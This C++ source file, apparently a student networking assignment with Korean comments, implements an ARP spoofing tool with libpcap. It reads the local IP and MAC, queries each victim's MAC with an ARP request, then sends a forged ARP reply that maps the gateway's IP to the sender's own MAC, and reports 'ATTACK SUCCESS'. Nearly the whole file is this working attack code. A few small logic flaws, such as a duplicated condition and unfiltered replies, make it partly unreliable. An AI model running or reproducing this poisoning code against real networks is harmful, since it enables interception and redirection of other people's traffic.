#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)


// mac주소의 경우 /sys/class/net/ + "dev" + /address 에 위치해 있다는 것을 알 수 있었다. 
// 해당 정보를 가지고 다음과 같이 프로그램을 작성 할 수 있었다. 

bool get_mac(const char* dev, char* mac) {
    std::string mac_addr;
    std::ifstream mac_get("/sys/class/net/" + std::string(dev) + "/address");

    if (mac_get) {
        std::getline(mac_get, mac_addr);
        mac_get.close();
        if (!mac_addr.empty()) {
            strcpy(mac, mac_addr.c_str());
            return true;
        }
    }
    return false;
}

// https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_ip(const char* dev, char* ip) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);

    std::string str(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    if (!str.empty()) {
        strcpy(ip, str.c_str());
        return true;
    }
    return false;
}

void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
   //인자의 경우 총 3개여서 argc의 최소값의 경우 4이기에 이 부분 제외 및 쌍 맞지 않는것 제외
   if (argc < 3 || argc % 2 != 0) {
      usage();
      return -1;
   }

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   /////////////////
   // MY IP & MAC //
   /////////////////

   char my_ip[Ip::SIZE];
   std::string my_ip_string;

   if(get_ip(dev, my_ip) == false){
      printf("FAIL GET IP\n");
      return 2;   
   }
   else{
      printf("IP : %s\n",my_ip);
      my_ip_string = std::string(my_ip);
   }

   char my_mac_string[Mac::SIZE];

   if(get_mac(dev,my_mac_string) == false){
      printf("FAIL GET MAC\n");
      return 2;
   }
   else{
      printf("MAC : %s\n",my_mac_string);
   }
   ////////////////////////////////////////////////////////////

	for(int i = 2; i < argc; i+=2){

    	std::string ip_v = std::string(argv[i]); //victim's ip
      	std::string ip_g = std::string(argv[i+1]); //gateway's ip
		std::string sender_mac;
		
		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //soon fix it
		packet.eth_.smac_ = Mac(my_mac_string);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac_string);
		packet.arp_.sip_ = htonl(Ip(my_ip_string));
		packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); //soon fix it
		packet.arp_.tip_ = htonl(Ip(ip_v));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		/////////////////////////////////////////////////////////////////////
      
		while(true){

			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("<PCAP ERROR CODE %d>\n", res);
				break;
			}

			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));

			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp) || eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply) || eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)){
				continue;
			}
			else{
				sender_mac = std::string(eth_arp_packet->arp_.smac_);
				break;
			}
      	}

		packet.eth_.dmac_ = Mac(sender_mac);
		packet.arp_.sip_ = htonl(Ip(ip_g));
		packet.arp_.tmac_ = Mac(sender_mac);

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			printf("\n\nATTACK FAILED\n\n");
		}
		else {
			printf("\nATTACK SUCCESS\n\n");
		}

   }

   pcap_close(handle);
}